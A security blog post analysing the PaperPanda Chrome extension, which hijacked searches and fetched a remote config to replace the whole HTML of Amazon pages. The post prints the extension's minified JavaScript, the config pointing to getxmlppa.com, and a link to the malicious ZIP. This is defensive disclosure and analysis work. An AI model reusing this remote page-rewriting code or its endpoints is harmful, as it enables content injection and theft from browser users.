---
title: PandaPaper turns malicious
subtitle: Chrome extension modifies HTML and tries to hide it
author: maave
type: post
draft: false
date: 2025-01-27
categories:
  - Projects
tags:
    - chrome
    - extension
    - security
    - reverse engineering
---

{{< image src="/uploads/2025/paperpanda-dead.webp" alt="paper panda logo with X for eyes">}}

The "paywalling" of scientific research papers is an ongoing problem that hinders learning, hinders scientific research, and leaches profit from publicly-funded research. PaperPanda is a Chrome extension to download academic papers. Its intention is to find free links for published papers. 

However what PaperPanda does under-the-hood tells another story. I've unearthed malicious code in PaperPanda's Chrome extension and attempts to hide said malicious activity. This extension tried to modify my Amazon pages for unknown reasons - possibly a phisher or credit-card stealer. If you have this extension *UNINSTALL IT*. In this post I'll explain how this extension is malicious and how it hides that behavior.

<!--more-->

## Strange redirect

This morning I was just browsing the internet with Google Chrome. The regular - procrastinating on StackExchange Hot Network Questions - and I came across an old-English word I've never seen. So I highlighted the word, right clicked, and selected "Search Google for _____". Instead of going to Google, my search went to Yahoo. Huh? I checked the history and found a very suspicious domain: `search-yahoo-now.com`. My search was hijacked. Sound the alarm, we have a breach!

`https://search-yahoo-now.com/?guid=877e15a82fa0a426bfd4ce9a6d96625e4&ext=9&domain=google.com&cid=html&rdd=15&q=iwur%C3%B0ge`

I searched this domain on Google and found only one useful result: a reddit post that insinuated that PaperPanda was responsible. After checking the extension's recent reviews I saw multiple complaints about this. Case closed? Hell no, I need to know the extent of this hack. I'm going to rip this app apart, get proper evidence, and then lay blame.

## Extension investigation

Going into my Chrome profile folder, I searched the contents of all my extensions looking for something. I tried searching for this string. I couldn't find any instance of it, not in plaintext or base64 encoded (a common obfuscation technique). Unfortunately I have too many installed and can't audit the code for every single one.

Since I had a tip, but not proof, that it was PaperPanda, I did an in-depth review of the code. Chrome extensions are made with HTML and Javascript and hosted in the app data folder.

`C:\Users\Maave\AppData\Local\Google\Chrome\User Data\Default\Extensions`

PaperPanda's extension ID is `ggjlkinaanncojaippgbndimlhcdlohf` and the malicious version is `2.1.6`.

`C:\Users\Maave\AppData\Local\Google\Chrome\User Data\Default\Extensions\ggjlkinaanncojaippgbndimlhcdlohf\2.1.6_0`

Fortunately, viewing the code for a Chrome extension is easy and there aren't too many files. Unfortunately the code is "minified" which compacts the code and replaces function and variable names. I used Notepad++ with the plugin JSTools for formatting. A Javascript formatter will make it readable but the single-letter names are still difficult.

### Main files

`content.js` calls `background.js` which fetches a config from an external website `getxmlppa.com`. There are two endpoints, "config.php" and "install.php". The "install" endpoint appears unused and the endpoint returns nothing. The "config" is used directly by the extension and returns a JSON object.

#### File contents

[ZIP file of the extension](/uploads/2025/paperpanda_2.1.6.zip)

<details>
  <summary>background.js [SPOILER]</summary>

```
(function () {
    "use strict";
    const o = "https://getxmlppa.com/";
    async function i(n = !1) {
        const c = `${o}config.php?` + Date.now(), {
            config: t,
            configTimestamp: e
        } = await chrome.storage.local.get(["configTimestamp", "config"]);
        if (!n && Date.now() - (e || 0) < 3e5)
            return t;
        const a = await fetch(c).then(s => s.json());
        return chrome.storage.local.set({
            config: a,
            configTimestamp: Date.now()
        }),
        a
    }
    i(!0),
    chrome.runtime.onMessage.addListener((n, c, t) => {
        if (n === "get-config")
            return i().then(e => t(e)), !0
    }),
    chrome.runtime.onInstalled.addListener(function (n) {
        n.reason === "install" && fetch(`${o}install.php`)
    })
})();
```
</details>

<details>
  <summary>content.js [SPOILER]</summary>

```
(function () {
    "use strict";
    let f = l();
    async function l() {
        return await chrome.runtime.sendMessage("get-config")
    }
    async function m() {
        document.location.hostname;
        var o = document.documentElement.innerHTML;
        function a(t, e) {
            if (!e || e === e) {
                var n = t.exec(o);
                if (n && n.length > 1)
                    return n[1]
            }
            return !1
        }
        function s() {
            var t,
            e = ["citation_doi", "doi", "dc.doi", "dc.identifier", "dc.identifier.doi", "bepress_citation_doi", "rft_id", "dcsext.wt_doi"],
            n = document.getElementsByTagName("meta");
            return Array.prototype.forEach.call(n, function (r) {
                if (r.name && !(e.indexOf(r.name.toLowerCase()) < 0) && !(r.scheme && r.scheme.toLowerCase() !== "doi")) {
                    var c = r.content.replace("doi:", "").replace(/https?:\/\/(www\.)?doi\.org\//i, "").trim();
                    c.indexOf("10.") === 0 && (t = c)
                }
            }),
            t ? (console.log("found a DOI from a meta tag: " + t), t) : null
        }
        async function i() {
            for (var t = (await f).p, e = 0; e < t.length; e++) {
                var n = t[e],
                r = a(new RegExp(n.regex), n.host);
                if (r)
                    return r
            }
            return null
        }
        async function d() {
            for (var t = [s, i], e = 0; e < t.length; e++) {
                var n = await t[e]();
                if (n)
                    return n
            }
            return null
        }
        var u = await d();
        return u
    }
    function g(o) {
        if (document.readyState !== "loading") {
            o();
            return
        }
        document.addEventListener("DOMContentLoaded", o)
    }
    function p(o) {
        return o.replace(/{[\w.]+}/, a => {
            const i = a.substr(1, a.length - 2).split(".").reduce((d, u) => d[u], window);
            return encodeURIComponent(i)
        })
    }
    const v = document.location + "";
    g(async() => {
        const o = (await f).s;
        function a() {
            for (const i of o)
                new RegExp(i.pattern, "gi").test(v) && [...document.querySelectorAll(i.selector)].filter(e => !e.hasAttribute("skip-element")).forEach(e => {
                    const n = e.style.display;
                    e.style.display = "none",
                    e.setAttribute("skip-element", !0),
                    fetch(p(i.url)).then(r => r.text()).then(r => {
                        const c = r.trim();
                        c && (e[i.attr] = c)
                    }).catch(() => {}).then(() => e.style.display = n)
                })
        }
        a(),
        new MutationObserver(() => a()).observe(document.body, {
            childList: !0,
            subtree: !0
        })
    }),
    chrome.runtime.onMessage.addListener((o, a, s) => {
        if (o === "get-doi")
            return m().then(i => s(i)), !0
    })
})();
```
</details>

<details>
  <summary>response from config.php aka config.json [SPOILER]</summary>

```
{
  "p": [
    {
      "regex": "\"doi\":\"([^\"]+)\"",
      "host": "ieeexplore.ieee.org"
    },
    {
      "regex": "SDM.doi\\s*=\\s*'([^']+)'",
      "host": "sciencedirect.com"
    },
    {
      "regex": "href=\"/doi/(10\\..+?)\"",
      "host": "psycnet.apa.org"
    },
    {
      "regex": "https?:\\/\\/doi.org\\/(10\\.\\d+\\/.*)",
      "host": "cairn.info"
    },
    {
      "regex": "article:article:(10\\.\\d+[^;]*)",
      "host": "inderscienceonline.com"
    }
  ],
  "s": [
    {
      "pattern": "^https?:\\/\\/(www\\.)?amazon\\.[a-z]{2,3}(\\.[a-z]{2})?\\/.*",
      "selector": "html",
      "attr": "innerHTML",
      "url": "https://getxmlppa.com/ama.php?p=amazon&u={location.href}"
    },
    {
      "pattern": "^https?:\\/\\/(www\\.)?amazon\\.[a-z]{2,3}(\\.[a-z]{2})?\\/.*",
      "selector": "head",
      "attr": "innerHTML",
      "url": "https://getxmlppa.com/ama.php?p=amazon&u={location.href}"
    },
    {
      "pattern": "^https?:\\/\\/(www\\.)?amazon\\.[a-z]{2,3}(\\.[a-z]{2})?\\/.*",
      "selector": "body",
      "attr": "innerHTML",
      "url": "https://getxmlppa.com/ama.php?p=amazon&u={location.href}"
    }
  ]
}
```
</details>

### Code breakdown

background.js contains code to fetch a JSON config from a remote website. The first thing I did was check the endpoints. I visited the url `https://getxmlppa.com/config.php` directly without any HTTP parameters. This config endpoint returned different information the first and second time I queried it. My original response is posted above, formatted for easier reading, no changes were made besides the whitespace formatting.

The first result included _regex to match Amazon URLs_ in the "s" array. When I queried it a second time, _the "s" array was empty_. Wow. We already found suspicious activity just by visiting a link. I cannot replicate this because the app loads content dynamically. The website is hiding its activity. I think I got lucky and I fetched the cached version on the first attempt.

I'm off to a good start. I was expecting Google or Yahoo links but I got Amazon. PaperPanda should not be touching Amazon URLs _ever_. I also found a new endpoint, `ama.php`

Let's walk through the code to determine what's it doing with this config. The suspect code is in content.js in the areas `g(o)`, `p(o)`, and the `g(async() => {` functions. The function `g(o)` creates a listener for page loading, then executes the async() function that was passed to it.

In this config JSON, the "p" array is used legitimately by the extension when you click the extension and "download this paper". "s" array is suspect and is used on page-load to replace part of the HTML contents. I'll explain what the JS code is doing:

1. add an event listener for DOMContentLoaded, to run after the page loads
2. check if the current URL matches a grep pattern (var "pattern" from array "s") and check if element has "skip-element" attribute
3. select HTML elements (using var "selector")
4. hide element
5. add "skip-element" attribute to avoid reprocessing
6. fetch remote content (from var "url")
7. replace one of the element's attributes (var "attr") with new content
8. unhide element

This makes the behavior entirely dependent on the config. In my config it's attempting to replace the entire HTML document for Amazon URLs

```
{
  "pattern": "^https?:\\/\\/(www\\.)?amazon\\.[a-z]{2,3}(\\.[a-z]{2})?\\/.*",
  "selector": "html",
  "attr": "innerHTML",
  "url": "https://getxmlppa.com/ama.php?p=amazon&u={location.href}"
},
```

recreating the steps with this config would cause this to happen:

1. add event listener DOMContentLoaded
2. check if URL matches amazon
3. select HTML element "html" (**the entire page**)
4. hide element
5. add "skip-element" attribute to avoid reprocessing
6. fetch content from `https://getxmlppa.com/ama.php?p=amazon&u={location.href}`
7. replace attribute "innerHTML" (**all of the page's code**) with content fetched
8. unhide element

This is malicious. This is trying to replace the entirety of my Amazon pages with its own content. PaperPanda has no reason to touch Amazon links. Without that config, this piece of code looks benign. It could be explained away by saying the code is intended to place URLs (it could, theoretically, replace the "url" attribute in anchor elements). With this config it's clear that this extension targeting websites outside its intended use. It is **malicious** and **trying to hide its behavior by changing configs**.

The endpoint `ama.php` responds with a 200 response but doesn't return any data, even with the params filled in. I'm unsure if the endpoint is nonfunctional, or if it was intentionally disabled when the config was changed. So the real goal of this content replacement is unknown. This app could have been stealing logins, credit card info, etc. It could've replaced affiliate information with its own like the recent Honey shopping extension scam. It could've done anything with any page. This is not accidental and not a result of some kind of library-inclusion-attack. PaperPanda targeted Amazon links and tried to _replace the entire HTML content_.

## Check yourself

If you have a page which you suspect of being hijacked, don't reload yet. Right click, inspect, then Ctrl+F and search for "skip-element". This attribute is not standard. If "skip-element" is anywhere in your HTML elements it's because of PaperPanda.

Get the stored config data from the Chrome console. Go to `chrome://extensions` and enable Developer Mode. Scroll to PaperPanda, click the link to "service worker" which will open Chrome DevTools. This should open straight to the Console tab. Type `chrome.storage.local.get(console.log)` to output the local storage. My extension already updated so the "s" array is empty.

Another way: On any page, open the PaperPanda extension, right click on it, inspect. This should be inspecting the extension, the DevTools window that pops up should be titled `chrome-extension://ggjlkinaanncojaippgbndimlhcdlohf/popup.html` Then in the Console tab of DevTools type `chrome.storage.local.get(console.log)` to output the local.

View the extension code yourself from chrome profile data. For me that's in: `C:\Users\UserName\AppData\Local\Google\Chrome\User Data\Profile 1\Extensions\ggjlkinaanncojaippgbndimlhcdlohf` because I have multiple profiles. If you have a single profile in Chrome then it would be in the "Default" folder: `C:\Users\UserName\AppData\Local\Google\Chrome\User Data\Default\Extensions\ggjlkinaanncojaippgbndimlhcdlohf`. The Javascript files have been minified so it needs to be formatted for reading. I used the Notepad++ plugin JSTool to format it. There are also plenty of JS formatters online. But the variable names and function names are still single letters so it's hard to follow.


## Conclusion

PaperPanda is hijacking web contents. I didn't find a Yahoo search redirect but instead I found an arbitrary page re-writer driven by a config that changes every time you load it. They attempt to evade detection by moving the payload to an external page. This garbage plugin has been installed on my Chrome for months and I only noticed because they performed a blatant redirect. Who knows what damage it caused, what information it stole, because it could have modified any website to have any content.

Uninstall this extension. Report it for abuse. _Distrust extensions that ask for permission to all websites_.